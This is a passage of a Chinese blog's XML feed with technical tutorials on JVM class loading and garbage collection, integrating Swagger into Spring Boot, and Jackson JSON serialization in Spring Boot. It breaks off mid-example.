当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么虚拟机会抛出 java.lang.OutOfMemoryError。 为避免以上原因引起的 Full GC，可采用的方法为增大永久代空间或转为使用 CMS GC。 5. Concurrent Mode Failure执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是 GC 过程中浮动垃圾过多导致暂时性的空间不足），便会报 Concurrent Mode Failure 错误，并触发 Full GC。 四、类加载机制类是在运行期间第一次使用时动态加载的，而不是一次性加载所有类。因为如果一次性加载，那么会占用很多的内存。 类的生命周期 包括以下 7 个阶段： 加载（Loading） 验证（Verification） 准备（Preparation） 解析（Resolution） 初始化（Initialization） 使用（Using） 卸载（Unloading） 类加载过程包含了加载、验证、准备、解析和初始化这 5 个阶段。 1. 加载加载是类加载的一个阶段，注意不要混淆。 加载过程完成以下三件事： 通过类的完全限定名称获取定义该类的二进制字节流。 将该字节流表示的静态存储结构转换为方法区的运行时存储结构。 在内存中生成一个代表该类的 Class 对象，作为方法区中该类各种数据的访问入口。 其中二进制字节流可以从以下方式中获取： 从 ZIP 包读取，成为 JAR、EAR、WAR 格式的基础。 从网络中获取，最典型的应用是 Applet。 运行时计算生成，例如动态代理技术，在 java.lang.reflect.Proxy 使用 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。 由其他文件生成，例如由 JSP 文件生成对应的 Class 类。 2. 验证确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。 3. 准备类变量是被 static 修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。 实例变量不会在这阶段分配内存，它会在对象实例化时随着对象一起被分配在堆中。应该注意到，实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。 初始值一般为 0 值，例如下面的类变量 value 被初始化为 0 而不是 123。 1public static int value = 123; 如果类变量是常量，那么它将初始化为表达式所定义的值而不是 0。例如下面的常量 value 被初始化为 123 而不是 0。 1public static final int value = 123; 4. 解析将常量池的符号引用替换为直接引用的过程。 其中解析过程在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 的动态绑定。 5. 初始化 初始化阶段才真正开始执行类中定义的 Java 程序代码。初始化阶段是虚拟机执行类构造器 &lt;clinit&gt;() 方法的过程。在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。 &lt;clinit&gt;() 是由编译器自动收集类中所有类变量的赋值动作和静态语句块中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问。例如以下代码： 1234567public class Test &#123; static &#123; i = 0; // 给变量赋值可以正常编译通过 System.out.print(i); // 这句编译器会提示“非法向前引用” &#125; static int i = 1;&#125; 由于父类的 &lt;clinit&gt;() 方法先执行，也就意味着父类中定义的静态语句块的执行要优先于子类。例如以下代码： 1234567891011121314static class Parent &#123; public static int A = 1; static &#123; A = 2; &#125;&#125;static class Sub extends Parent &#123; public static int B = A;&#125;public static void main(String[] args) &#123; System.out.println(Sub.B); // 2&#125; 接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成 &lt;clinit&gt;() 方法。但接口与类不同的是，执行接口的 &lt;clinit&gt;() 方法不需要先执行父接口的 &lt;clinit&gt;() 方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的 &lt;clinit&gt;() 方法。 虚拟机会保证一个类的 &lt;clinit&gt;() 方法在多线程环境下被正确的加锁和同步，如果多个线程同时初始化一个类，只会有一个线程执行这个类的 &lt;clinit&gt;() 方法，其它线程都会阻塞等待，直到活动线程执行 &lt;clinit&gt;() 方法完毕。如果在一个类的 &lt;clinit&gt;() 方法中有耗时的操作，就可能造成多个线程阻塞，在实际过程中此种阻塞很隐蔽。 类初始化时机1. 主动引用虚拟机规范中并没有强制约束何时进行加载，但是规范严格规定了有且只有下列五种情况必须对类进行初始化（加载、验证、准备都会随之发生）： 遇到 new、getstatic、putstatic、invokestatic 这四条字节码指令时，如果类没有进行过初始化，则必须先触发其初始化。最常见的生成这 4 条指令的场景是：使用 new 关键字实例化对象的时候；读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）的时候；以及调用一个类的静态方法的时候。 使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。 当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。 当虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类； 当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果为 REF_getStatic, REF_putStatic, REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化； 2. 被动引用以上 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用。被动引用的常见例子包括： 通过子类引用父类的静态字段，不会导致子类初始化。 1System.out.println(SubClass.value); // value 字段在 SuperClass 中定义 通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自 Object 的子类，其中包含了数组的属性和方法。 1SuperClass[] sca = new SuperClass[10]; 常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。 1System.out.println(ConstClass.HELLOWORLD); 类与类加载器两个类相等，需要类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。 这里的相等，包括类的 Class 对象的 equals() 方法、isAssignableFrom() 方法、isInstance() 方法的返回结果为 true，也包括使用 instanceof 关键字做对象所属关系判定结果为 true。 类加载器分类从 Java 虚拟机的角度来讲，只存在以下两种不同的类加载器： 启动类加载器（Bootstrap ClassLoader），使用 C++ 实现，是虚拟机自身的一部分； 所有其它类的加载器，使用 Java 实现，独立于虚拟机，继承自抽象类 java.lang.ClassLoader。 从 Java 开发人员的角度看，类加载器可以划分得更细致一些： 启动类加载器（Bootstrap ClassLoader）此类加载器负责将存放在 &lt;JRE_HOME&gt;\lib 目录中的，或者被 -Xbootclasspath 参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用 null 代替即可。 扩展类加载器（Extension ClassLoader）这个类加载器是由 ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的。它负责将 &lt;JAVA_HOME&gt;/lib/ext 或者被 java.ext.dir 系统变量所指定路径中的所有类库加载到内存中，开发者可以直接使用扩展类加载器。 应用程序类加载器（Application ClassLoader）这个类加载器是由 AppClassLoader（sun.misc.Launcher$AppClassLoader）实现的。由于这个类加载器是 ClassLoader 中的 getSystemClassLoader() 方法的返回值，因此一般称为系统类加载器。它负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 双亲委派模型应用程序是由三种类加载器互相配合从而实现类加载，除此之外还可以加入自己定义的类加载器。 下图展示了类加载器之间的层次关系，称为双亲委派模型（Parents Delegation Model）。该模型要求除了顶层的启动类加载器外，其它的类加载器都要有自己的父类加载器。这里的父子关系一般通过组合关系（Composition）来实现，而不是继承关系（Inheritance）。 1. 工作过程一个类加载器首先将类加载请求转发到父类加载器，只有当父类加载器无法完成时才尝试自己加载。 2. 好处使得 Java 类随着它的类加载器一起具有一种带有优先级的层次关系，从而使得基础类得到统一。 例如 java.lang.Object 存放在 rt.jar 中，如果编写另外一个 java.lang.Object 并放到 ClassPath 中，程序可以编译通过。由于双亲委派模型的存在，所以在 rt.jar 中的 Object 比在 ClassPath 中的 Object 优先级更高，这是因为 rt.jar 中的 Object 使用的是启动类加载器，而 ClassPath 中的 Object 使用的是应用程序类加载器。rt.jar 中的 Object 优先级更高，那么程序中所有的 Object 都是这个 Object。 3. 实现以下是抽象类 java.lang.ClassLoader 的代码片段，其中的 loadClass() 方法运行过程如下：先检查类是否已经加载过，如果没有则让父类加载器去加载。当父类加载器加载失败时抛出 ClassNotFoundException，此时尝试自己去加载。 1234567891011121314151617181920212223242526272829303132333435363738394041public abstract class ClassLoader &#123; // The parent class loader for delegation private final ClassLoader parent; public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; return loadClass(name, false); &#125; protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; try &#123; if (parent != null) &#123; c = parent.loadClass(name, false); &#125; else &#123; c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. c = findClass(name); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; throw new ClassNotFoundException(name); &#125;&#125; 自定义类加载器实现以下代码中的 FileSystemClassLoader 是自定义类加载器，继承自 java.lang.ClassLoader，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass() 方法来把这些字节代码转换成 java.lang.Class 类的实例。 java.lang.ClassLoader 的 loadClass() 实现了双亲委派模型的逻辑，自定义类加载器一般不去重写它，但是需要重写 findClass() 方法。 12345678910111213141516171819202122232425262728293031323334353637383940public class FileSystemClassLoader extends ClassLoader &#123; private String rootDir; public FileSystemClassLoader(String rootDir) &#123; this.rootDir = rootDir; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootDir + File.separatorChar + className.replace('.', File.separatorChar) + ".class"; &#125;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot整合Swagger构建RESTful风格API]]></title>
    <url>%2F2019%2F01%2F11%2FSpringboot%E6%95%B4%E5%90%88Swagger%E6%9E%84%E5%BB%BARESTful%E9%A3%8E%E6%A0%BCAPI%2F</url>
    <content type="text"><![CDATA[Swagger是一款可以快速生成符合RESTful风格API并进行在线调试的插件。本文将介绍如何在Spring Boot中整合Swagger。 在此之前，我们先聊聊什么是REST。REST实际上为Representational State Transfer的缩写，翻译为“表现层状态转化” 。如果一个架构符合REST 原则，就称它为RESTful架构。 实际上，“表现层状态转化”省略了主语，完整的说应该是“资源表现层状态转化”。什么是资源（Resource）？资源指的是网络中信息的表现形式，比如一段文本，一首歌，一个视频文件等等；什么是表现层（Reresentational）？表现层即资源的展现在你面前的形式，比如文本可以是JSON格式的，也可以是XML形式的，甚至为二进制形式的。图片可以是gif，也可以是PNG；什么是状态转换（State Transfer）？用户可使用URL通过HTTP协议来获取各种资源，HTTP协议包含了一些操作资源的方法，比如：GET 用来获取资源， POST 用来新建资源 , PUT 用来更新资源， DELETE 用来删除资源， PATCH 用来更新资源的部分属性。通过这些HTTP协议的方法来操作资源的过程即为状态转换。 下面对比下传统URL请求和RESTful风格请求的区别： 描述 传统请求 方法 RESTful请求 方法 查询 /user/query?name=mrbird GET /user?name=mrbird GET 详情 /user/getInfo?id=1 GET /user/1 GET 创建 /user/create?name=mrbird POST /user POST 修改 /user/update?name=mrbird&amp;id=1 POST /user/1 PUT 删除 /user/delete?id=1 GET /user/1 DELETE 从上面这张表，我们大致可以总结下传统请求和RESTful请求的几个区别： 传统请求通过URL来描述行为，如create，delete等；RESTful请求通过URL来描述资源。 RESTful请求通过HTTP请求的方法来描述行为，比如DELETE，POST，PUT等，并且使用HTTP状态码来表示不同的结果。 RESTful请求通过JSON来交换数据。 RESTful只是一种风格，并不是一种强制性的标准。 引入Swagger依赖本文使用的Swagger版本为2.6.1： 12345678910&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt;&lt;/dependency&gt; 配置SwaggerConfig使用JavaConfig的形式配置Swagger： 1234567891011121314151617181920212223242526272829303132import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.ApiInfo;import springfox.documentation.service.Contact;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2;@Configuration@EnableSwagger2public class SwaggerConfig &#123; @Bean public Docket buildDocket() &#123; return new Docket(DocumentationType.SWAGGER_2) .apiInfo(buildApiInf()) .select() .apis(RequestHandlerSelectors.basePackage(&quot;com.example.demo.controller&quot;)) .paths(PathSelectors.any()) .build(); &#125; private ApiInfo buildApiInf() &#123; return new ApiInfoBuilder() .title(&quot;系统RESTful API文档&quot;) .contact(new Contact(&quot;mrbird&quot;, &quot;https://mrbird.cc&quot;, &quot;852252810@qq.com&quot;)) .version(&quot;1.0&quot;) .build(); &#125;&#125; 在配置类中添加@EnableSwagger2注解来启用Swagger2，apis()定义了扫描的包路径。配置较为简单，其他不做过多说明。 Swagger常用注解 @Api：修饰整个类，描述Controller的作用； @ApiOperation：描述一个类的一个方法，或者说一个接口； @ApiParam：单个参数描述； @ApiModel：用对象来接收参数； @ApiProperty：用对象接收参数时，描述对象的一个字段； @ApiResponse：HTTP响应其中1个描述； @ApiResponses：HTTP响应整体描述； @ApiIgnore：使用该注解忽略这个API； @ApiError ：发生错误返回的信息； @ApiImplicitParam：一个请求参数； @ApiImplicitParams：多个请求参数。 编写RESTful API接口Spring Boot中包含了一些注解，对应于HTTP协议中的方法： @GetMapping对应HTTP中的GET方法； @PostMapping对应HTTP中的POST方法； @PutMapping对应HTTP中的PUT方法； @DeleteMapping对应HTTP中的DELETE方法； @PatchMapping对应HTTP中的PATCH方法。 我们使用这些注解来编写一个RESTful测试Controller： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.DeleteMapping;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.PutMapping;import org.springframework.web.bind.annotation.RequestBody;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;import com.example.demo.domain.User;import io.swagger.annotations.Api;import io.swagger.annotations.ApiImplicitParam;import io.swagger.annotations.ApiImplicitParams;import io.swagger.annotations.ApiOperation;import springfox.documentation.annotations.ApiIgnore;@Api(value = &quot;用户Controller&quot;)@Controller@RequestMapping(&quot;user&quot;)public class UserController &#123; @ApiIgnore @GetMapping(&quot;hello&quot;) public @ResponseBody String hello() &#123; return &quot;hello&quot;; &#125; @ApiOperation(value = &quot;获取用户信息&quot;, notes = &quot;根据用户id获取用户信息&quot;) @ApiImplicitParam(name = &quot;id&quot;, value = &quot;用户id&quot;, required = true, dataType = &quot;Long&quot;, paramType = &quot;path&quot;) @GetMapping(&quot;/&#123;id&#125;&quot;) public @ResponseBody User getUserById(@PathVariable(value = &quot;id&quot;) Long id) &#123; User user = new User(); user.setId(id); user.setName(&quot;mrbird&quot;); user.setAge(25); return user; &#125; @ApiOperation(value = &quot;获取用户列表&quot;, notes = &quot;获取用户列表&quot;) @GetMapping(&quot;/list&quot;) public @ResponseBody List&lt;User&gt; getUserList() &#123; List&lt;User&gt; list = new ArrayList&lt;&gt;(); User user1 = new User(); user1.setId(1l); user1.setName(&quot;mrbird&quot;); user1.setAge(25); list.add(user1); User user2 = new User(); user2.setId(2l); user2.setName(&quot;scott&quot;); user2.setAge(29); list.add(user2); return list; &#125; @ApiOperation(value = &quot;新增用户&quot;, notes = &quot;根据用户实体创建用户&quot;) @ApiImplicitParam(name = &quot;user&quot;, value = &quot;用户实体&quot;, required = true, dataType = &quot;User&quot;) @PostMapping(&quot;/add&quot;) public @ResponseBody Map&lt;String, Object&gt; addUser(@RequestBody User user) &#123; Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;result&quot;, &quot;success&quot;); return map; &#125; @ApiOperation(value = &quot;删除用户&quot;, notes = &quot;根据用户id删除用户&quot;) @ApiImplicitParam(name = &quot;id&quot;, value = &quot;用户id&quot;, required = true, dataType = &quot;Long&quot;, paramType = &quot;path&quot;) @DeleteMapping(&quot;/&#123;id&#125;&quot;) public @ResponseBody Map&lt;String, Object&gt; deleteUser(@PathVariable(value = &quot;id&quot;) Long id) &#123; Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;result&quot;, &quot;success&quot;); return map; &#125; @ApiOperation(value = &quot;更新用户&quot;, notes = &quot;根据用户id更新用户&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(name = &quot;id&quot;, value = &quot;用户id&quot;, required = true, dataType = &quot;Long&quot;, paramType = &quot;path&quot;), @ApiImplicitParam(name = &quot;user&quot;, value = &quot;用户实体&quot;, required = true, dataType = &quot;User&quot;) &#125;) @PutMapping(&quot;/&#123;id&#125;&quot;) public @ResponseBody Map&lt;String, Object&gt; updateUser(@PathVariable(value = &quot;id&quot;) Long id, @RequestBody User user) &#123; Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;result&quot;, &quot;success&quot;); return map; &#125;&#125; 对于不需要生成API的方法或者类，只需要在上面添加@ApiIgnore注解即可。 启动&amp;测试启动项目，访问http://localhost:8080/swagger-ui.html即可看到Swagger给我们生成的API页面： 点击接口下的“Try it out”Swagger会用curl命令发送请求，并且返回响应信息，如下所示:]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>Swagger</tag>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot中的JSON技术]]></title>
    <url>%2F2019%2F01%2F11%2FSpringboot%E4%B8%AD%E7%9A%84JSON%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[平日里在项目中处理JSON一般用的都是阿里巴巴的Fastjson，后来发现使用Spring Boot内置的Jackson来完成JSON的序列化和反序列化操作也挺方便。Jackson不但可以完成简单的序列化和反序列化操作，也能实现复杂的个性化的序列化和反序列化操作。 自定义ObjectMapper我们都知道，在Spring中使用@ResponseBody注解可以将方法返回的对象序列化成JSON，比如： 12345678@RequestMapping(&quot;getuser&quot;)@ResponseBodypublic User getUser() &#123; User user = new User(); user.setUserName(&quot;mrbird&quot;); user.setBirthday(new Date()); return user;&#125; User类： 123456789public class User implements Serializable &#123; private static final long serialVersionUID = 6222176558369919436L; private String userName; private int age; private String password; private Date birthday; ...&#125; 访问getuser页面输出： 1&#123;&quot;userName&quot;:&quot;mrbird&quot;,&quot;age&quot;:0,&quot;password&quot;:null,&quot;birthday&quot;:1522634892365&#125; 可看到时间默认以时间戳的形式输出，如果想要改变这个默认行为，我们可以自定义一个ObjectMapper来替代： 12345678910111213141516import java.text.SimpleDateFormat;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import com.fasterxml.jackson.databind.ObjectMapper;@Configurationpublic class JacksonConfig &#123; @Bean public ObjectMapper getObjectMapper()&#123; ObjectMapper mapper = new ObjectMapper(); mapper.setDateFormat(new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;)); return mapper; &#125;&#125; 上面配置获取了ObjectMapper对象，并且设置了时间格式。再次访问getuser，页面输出： 1&#123;&quot;userName&quot;:&quot;mrbird&quot;,&quot;age&quot;:0,&quot;password&quot;:null,&quot;birthday&quot;:&quot;2018-04-02 10:14:24&quot;&#125; 序列化Jackson通过使用mapper的writeValueAsString方法将Java对象序列化为JSON格式字符串： 1234567891011121314151617@AutowiredObjectMapper mapper;@RequestMapping(&quot;serialization&quot;)@ResponseBodypublic String serialization() &#123; try &#123; User user = new User(); user.setUserName(&quot;mrbird&quot;); user.setBirthday(new Date()); String str = mapper.writeValueAsString(user); return str; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125; 反序列化使用@ResponseBody注解可以使对象序列化为JSON格式字符串，除此之外，Jackson也提供了反序列化方法。 树遍历当采用树遍历的方式时，JSON被读入到JsonNode对象中，可以像操作XML DOM那样读取JSON。比如： 1234567891011121314151617@AutowiredObjectMapper mapper;@RequestMapping(&quot;readjsonstring&quot;)@ResponseBodypublic String readJsonString() &#123; try &#123; String json = &quot;&#123;\&quot;name\&quot;:\&quot;mrbird\&quot;,\&quot;age\&quot;:26&#125;&quot;; JsonNode node = this.mapper.readTree(json); String name = node.get(&quot;name&quot;).asText(); int age = node.get(&quot;age&quot;).asInt(); return name + &quot; &quot; + age; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125; readTree方法可以接受一个字符串或者字节数组、文件、InputStream等， 返回JsonNode作为根节点，你可以像操作XML DOM那样操作遍历JsonNode以获取数据。 解析多级JSON例子： 1234String json = &quot;&#123;\&quot;name\&quot;:\&quot;mrbird\&quot;,\&quot;hobby\&quot;:&#123;\&quot;first\&quot;:\&quot;sleep\&quot;,\&quot;second\&quot;:\&quot;eat\&quot;&#125;&#125;&quot;;;JsonNode node = this.mapper.readTree(json);JsonNode hobby = node.get(&quot;hobby&quot;);String first = hobby.get(&quot;first&quot;).asText(); 绑定对象我们也可以将Java对象和JSON数据进行绑定，如下所示： 1234567891011121314151617@AutowiredObjectMapper mapper;@RequestMapping(&quot;readjsonasobject&quot;)@ResponseBodypublic String readJsonAsObject() &#123; try &#123; String json = &quot;&#123;\&quot;name\&quot;:\&quot;mrbird\&quot;,\&quot;age\&quot;:26&#125;&quot;; User user = mapper.readValue(json, User.class); String name = user.getUserName(); int age = user.getAge(); return name + &quot; &quot; + age; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125; Jackson注解Jackson包含了一些实用的注解： @JsonProperty@JsonProperty，作用在属性上，用来为JSON Key指定一个别名。 12@JsonProperty(&quot;bth&quot;)private Date birthday; 再次访问getuser页面输出： 1&#123;&quot;userName&quot;:&quot;mrbird&quot;,&quot;age&quot;:0,&quot;password&quot;:null,&quot;bth&quot;:&quot;2018-04-02 10:38:37&quot;&#125; key birthday已经被替换为了bth。 @Jsonlgnore@Jsonlgnore，作用在属性上，用来忽略此属性。 12@JsonIgnoreprivate String password; 再次访问getuser页面输出： 1&#123;&quot;userName&quot;:&quot;mrbird&quot;,&quot;age&quot;:0,&quot;bth&quot;:&quot;2018-04-02 10:40:45&quot;&#125; password属性已被忽略。 @JsonIgnoreProperties@JsonIgnoreProperties，忽略一组属性，作用于类上，比如JsonIgnoreProperties({ &quot;password&quot;, &quot;age&quot; })。 1234@JsonIgnoreProperties(&#123; &quot;password&quot;, &quot;age&quot; &#125;)public class User implements Serializable &#123; ...&#125; 再次访问getuser页面输出： 1&#123;&quot;userName&quot;:&quot;mrbird&quot;,&quot;bth&quot;:&quot;2018-04-02 10:45:34&quot;&#125; @JsonFormat@JsonFormat，用于日期格式化，如： 12@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)private Date birthday; @JsonNaming@JsonNaming，用于指定一个命名策略，作用于类或者属性上。Jackson自带了多种命名策略，你可以实现自己的命名策略，比如输出的key 由Java命名方式转为下面线命名方法 —— userName转化为user-name。 1234@JsonNaming(PropertyNamingStrategy.LowerCaseWithUnderscoresStrategy.class)public class User implements Serializable &#123; ...&#125; 再次访问getuser页面输出： 1&#123;&quot;user_name&quot;:&quot;mrbird&quot;,&quot;bth&quot;:&quot;2018-04-02 10:52:12&quot;&#125; @JsonSerialize@JsonSerialize，指定一个实现类来自定义序列化。类必须实现JsonSerializer接口，代码如下： 123456789101112131415161718import java.io.IOException;import com.example.pojo.User;import com.fasterxml.jackson.core.JsonGenerator;import com.fasterxml.jackson.core.JsonProcessingException;import com.fasterxml.jackson.databind.JsonSerializer;import com.fasterxml.jackson.databind.SerializerProvider;public class UserSerializer extends JsonSerializer&lt;User&gt; &#123; @Override public void serialize(User user, JsonGenerator generator, SerializerProvider provider) throws IOException, JsonProcessingException &#123; generator.writeStartObject(); generator.writeStringField(&quot;user-name&quot;, user.getUserName()); generator.writeEndObject(); &#125;&#125; 上面的代码中我们仅仅序列化userName属性，且输出的key是user-name。 使用注解@JsonSerialize来指定User对象的序列化方式： 1234@JsonSerialize(using = UserSerializer.class)public class User implements Serializable &#123; ...&#125; 再次访问getuser页面输出： 1&#123;&quot;user-name&quot;:&quot;mrbird&quot;&#125; @JsonDeserialize@JsonDeserialize，用户自定义反序列化，同@JsonSerialize ，类需要实现JsonDeserializer接口。 123456789101112131415161718192021import java.io.IOException;import com.example.pojo.User;import com.fasterxml.jackson.core.JsonParser;import com.fasterxml.jackson.core.JsonProcessingException;import com.fasterxml.jackson.databind.DeserializationContext;import com.fasterxml.jackson.databind.JsonDeserializer;import com.fasterxml.jackson.databind.JsonNode;public class UserDeserializer extends JsonDeserializer&lt;User&gt; &#123; @Override public User deserialize(JsonParser parser, DeserializationContext context) throws IOException, JsonProcessingException &#123; JsonNode node = parser.getCodec().readTree(parser); String userName = node.get(&quot;user-name&quot;).asText(); User user = new User(); user.setUserName(userName); return user; &#125;&#125; 使用注解@JsonDeserialize来指定User对象的序列化方式： 1234@JsonDeserialize (using = UserDeserializer.class)public class User implements Serializable &#123; ...&#125; 测试： 12345678910111213141516@AutowiredObjectMapper mapper;@RequestMapping(&quot;readjsonasobject&quot;)@ResponseBodypublic String readJsonAsObject() &#123; try &#123; String json = &quot;&#123;\&quot;user-name\&quot;:\&quot;mrbird\&quot;&#125;&quot;; User user = mapper.readValue(json, User.class); String name = user.getUserName(); return name; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125; 访问readjsonasobject，页面输出： 1mrbird @JsonView@JsonView，作用在类或者属性上，用来定义一个序列化组。 比如对于User对象，某些情况下只返回userName属性就行，而某些情况下需要返回全部属性。 因此User对象可以定义成如下： 12345678910111213141516171819public class User implements Serializable &#123; private static final long serialVersionUID = 6222176558369919436L; public interface UserNameView &#123;&#125;; public interface AllUserFieldView extends UserNameView &#123;&#125;; @JsonView(UserNameView.class) private String userName; @JsonView(AllUserFieldView.class) private int age; @JsonView(AllUserFieldView.class) private String password; @JsonView(AllUserFieldView.class) private Date birthday; ... &#125; User定义了两个接口类，一个为userNameView，另外一个为AllUserFieldView继承了userNameView接口。这两个接口代表了两个序列化组的名称。属性userName使用了@JsonView(UserNameView.class)，而剩下属性使用了@JsonView(AllUserFieldView.class)。 Spring中Controller方法允许使用@JsonView指定一个组名，被序列化的对象只有在这个组的属性才会被序列化，代码如下： 1234567891011@JsonView(User.UserNameView.class)@RequestMapping(&quot;getuser&quot;)@ResponseBodypublic User getUser() &#123; User user = new User(); user.setUserName(&quot;mrbird&quot;); user.setAge(26); user.setPassword(&quot;123456&quot;); user.setBirthday(new Date()); return user;&#125; 访问getuser页面输出： 1&#123;&quot;userName&quot;:&quot;mrbird&quot;&#125; 如果将@JsonView(User.UserNameView.class)替换为@JsonView(User.AllUserFieldView.class)，输出： 1&#123;&quot;userName&quot;:&quot;mrbird&quot;,&quot;age&quot;:26,&quot;password&quot;:&quot;123456&quot;,&quot;birthday&quot;:&quot;2018-04-02 11:24:00&quot;&#125; 因为接口AllUserFieldView继承了接口UserNameView所以userName也会被输出。 集合的反序列化在Controller方法中，可以使用＠RequestBody将提交的JSON自动映射到方法参数上，比如： 12345@RequestMapping(&quot;updateuser&quot;)@ResponseBodypublic int updateUser(@RequestBody List&lt;User&gt; list)&#123; return list.size();&#125; 上面方法可以接受如下一个JSON请求，并自动映射到User对象上： 1[&#123;&quot;userName&quot;:&quot;mrbird&quot;,&quot;age&quot;:26&#125;,&#123;&quot;userName&quot;:&quot;scott&quot;,&quot;age&quot;:27&#125;] Spring Boot 能自动识别出List对象包含的是User类，因为在方法中定义的泛型的类型会被保留在字节码中，所以Spring Boot能识别List包含的泛型类型从而能正确反序列化。 有些情况下，集合对象并没有包含泛型定义，如下代码所示，反序列化并不能得到期望的结果。 1234567891011121314@AutowiredObjectMapper mapper;@RequestMapping(&quot;customize&quot;)@ResponseBodypublic String customize() throws JsonParseException, JsonMappingException, IOException &#123; String jsonStr = 